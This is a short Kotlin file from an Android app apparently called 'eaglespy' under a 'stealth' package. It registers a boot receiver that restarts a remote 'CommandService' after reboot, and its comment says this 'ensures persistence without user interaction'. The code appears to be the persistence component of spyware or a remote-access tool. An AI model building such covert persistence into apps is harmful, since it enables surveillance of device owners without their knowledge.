package com.stealth.eaglespy.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

/**
 * Boot Receiver - Restarts services after device reboot
 * Ensures persistence without user interaction
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == "android.intent.action.QUICKBOOT_POWERON") {
            
            // Start command service after boot
            val serviceIntent = Intent(context, CommandService::class.java).apply {
                action = "BOOT_START"
            }
            
            ContextCompat.startForegroundService(context, serviceIntent)
        }
    }
}
